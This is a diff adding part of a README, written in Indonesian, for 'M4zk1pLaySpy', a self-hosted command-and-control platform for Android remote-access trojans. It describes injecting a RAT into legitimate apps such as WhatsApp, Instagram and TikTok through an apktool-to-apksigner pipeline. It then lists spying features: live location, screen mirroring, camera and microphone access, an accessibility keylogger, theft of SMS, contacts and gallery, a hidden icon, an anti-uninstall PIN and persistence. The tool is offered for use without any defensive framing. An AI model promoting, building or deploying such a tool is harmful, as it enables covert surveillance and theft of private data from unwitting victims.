@@ -20,3 +20,49 @@
 [0;31m  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
 [0;33m  root@m4zk1play:~# ./run.sh → http://127.0.0.1:8777
 [0;33m  license → M4ZK1PL4Y
+</div>
+⚡ Apa ini
+M4zk1pLaySpy adalah platform Command & Control (C2) fullstack yang jalan lokal di mesin lo.
+Lo build APK payload sendiri, atau upload APK resmi (WhatsApp, IG, TikTok, dll) lalu tools ini menyisipkan dex RAT ke dalamnya lewat pipeline apktool → dex-inject → manifest-patch → zipalign → apksigner.
+
+Hasil APK-nya nyambung ke server C2 lo. Bukan cloud, bukan SaaS, bukan ada batas target.
+
+🔥 Kapabilitas
+<table> <tr><td width="50%" valign="top">
+KONTROL DEVICE
+
+Lokasi realtime (GPS + network)
+Screen mirroring realtime + remote tap/swipe/key
+Kamera depan & belakang live
+Audio dua arah (mic + speaker)
+Ganti wallpaper remote
+Push audio/video + auto-play
+Kunci layar remote
+DUMP DATA
+
+Kontak · SMS · Call log
+Galeri (thumbnail + full)
+Notifikasi (listener)
+Screenshot on-demand
+Keylogger accessibility
+IP + ISP + geo target
+</td><td width="50%" valign="top">
+PERSENJATAAN APK
+
+Build APK baru (nama, ikon, wallpaper, wizard)
+Inject ke APK resmi (dex + manifest otomatis)
+One-tap permission (semua izin sekali klik)
+Sembunyikan ikon dari launcher
+Anti-uninstall PIN 211421
+Foreground service persisten
+Auto-start via ContentProvider
+Signing keystore otomatis
+C2
+
+Dashboard dark-brutal
+Status online/offline realtime
+Multi-target, pilih & switch target
+Download semua hasil dump
+Audit log admin
+License gate
+</td></tr> </table>
